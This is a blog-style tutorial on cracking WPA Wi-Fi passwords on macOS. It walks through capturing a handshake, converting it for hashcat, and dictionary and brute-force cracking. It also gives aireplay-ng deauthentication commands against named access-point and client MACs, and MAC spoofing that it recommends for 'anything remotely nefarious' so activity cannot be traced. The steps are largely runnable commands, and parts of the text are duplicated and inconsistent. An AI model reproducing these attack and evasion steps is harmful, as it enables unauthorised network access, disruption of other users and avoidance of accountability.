---
title: WiFi Cracker in Mac OS X
date: 2020-01-12 23:04:34
categories: [Basic, Security, Tools]
tags:
---

Mac OS X comes with a suite of wireless diagnostic tools. To open them, hold down the option key on your keyboard and click on the Wi-Fi icon in the menu bar. Then click "Open Wireless Diagnostics..." and then click on Window > Scan. Find the target network, note its channel and width.

<!--more-->

# Capture a 4-way Handshake
With Wireless Diagnostics open, click on Window > Sniffer. Select the channel and width that you found in the previous step.
Now you'll need to wait for a device to connect to the target network. If you are testing this on your network (which you should be), reconnect a wireless device to capture a handshake.
Once you think you've got a handshake, click Stop.
The .wcap capture file will either be saved to your Desktop or /var/tmp/ depending on your operating system version.
Convert the capture file to .hccapx by uploading it to https://hashcat.net/cap2hccapx/. If you captured any handshakes, the site will start downloading a .hccapx file. No download will be prompted if you did not.

* With Wireless Diagnostics open, click on Window > Sniffer. Select the channel and width that you found in the previous step.
* Now you'll need to wait for a device to connect to the target network. If you are testing this on your network (which you should be), reconnect a wireless device to capture a handshake.
* Once you think you've got a handshake, click Stop.
The .pcap capture file will either be saved to your Desktop or /var/tmp/ depending on your operating system version.
* Convert the capture file to .hccapx by using https://github.com/hashcat/hashcat-utils in src folder compile to bin.
  
`gcc -o cap2hccapx cap2hccapx.c" and then run it: "./cap2hccapx"`

# Crack the password with hashcat

```
brew install hashcat
hashcat -m 2500 capture.hccapx wordlist.txt
# or brute force
hashcat -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d
```

# Wordlist - Download the 134MB rockyou dictionary file

```
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

```
Other bigger candidates: 
* https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length
* https://xa.to/10m

# Deauth Attack

## Get deauth Tool
```
brew install aircrack-ng
```
Find `aireplay-ng` in sbin.

```
# -0 2 specifies we would like to send 2 deauth packets. Increase this number
# if need be with the risk of noticeably interrupting client network activity
# -a is the MAC of the access point
# -c is the MAC of the client
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
```
You can optionally broadcast deauth packets to all connected clients with:
```
# not all clients respect broadcast deauths though
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0
```

# Spoof MAC address

Whenever you are doing anything remotely nefarious with Wi-Fi, it is a good idea to spoof your MAC address of your Wi-Fi device so that any network traffic that gets recorded can't be tied to serial assigned by your device manufacturer.

For CentOS or Debian based systems, `macchanger` could do the trick, however, for Mac OSX catalina, [SpoofMAC](https://github.com/feross/SpoofMAC) should be the best choice, since new version Mac OSX implemented new file access and secure methodology.

## macchanger

```
This is trivial with macchanger:

# download MAC changer
sudo apt-get install macchanger

# bring the device down
sudo ifconfig wlan0 down

# change the mac
# -A pics a random MAC w/ a valid vendor
# -r makes it truly random
# -p restores it to the original hardware MAC
sudo macchanger -A wlan0

# bring the device back up
sudo ifconfig wlan0 up

```

## SpoofMAC

```
pip install SpoofMAC
spoof-mac.py list
spoof-mac.py randomize wi-fi
spoof-mac.py set 00:00:00:00:00:00 en0
```

### Run automatically at startup

```
# Download the startup file for launchd
curl https://raw.githubusercontent.com/feross/SpoofMAC/master/misc/local.macspoof.plist > local.macspoof.plist

# Customize location of `spoof-mac.py` to match your system
cat local.macspoof.plist | sed "s|/usr/local/bin/spoof-mac.py|`which spoof-mac.py`|" | tee local.macspoof.plist

# Copy file to the OS X launchd folder
sudo cp local.macspoof.plist /Library/LaunchDaemons

# Set file permissions
cd /Library/LaunchDaemons
sudo chown root:wheel local.macspoof.plist
sudo chmod 0644 local.macspoof.plist
```

The plist file should be like this:

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
	    <key>Label</key>
	    <string>MacSpoof</string>

	    <key>ProgramArguments</key>
	    <array>
            <string>/Library/Frameworks/Python.framework/Versions/3.8/bin/spoof-mac.py</string>
	        <string>randomize</string>
	        <string>en0</string>
	    </array>

	    <key>RunAtLoad</key>
	    <true/>
</dict>
</plist>
```

reference:

https://github.com/brannondorsey/wifi-cracking
https://louisabraham.github.io/articles/WPA-wifi-cracking-MBP.html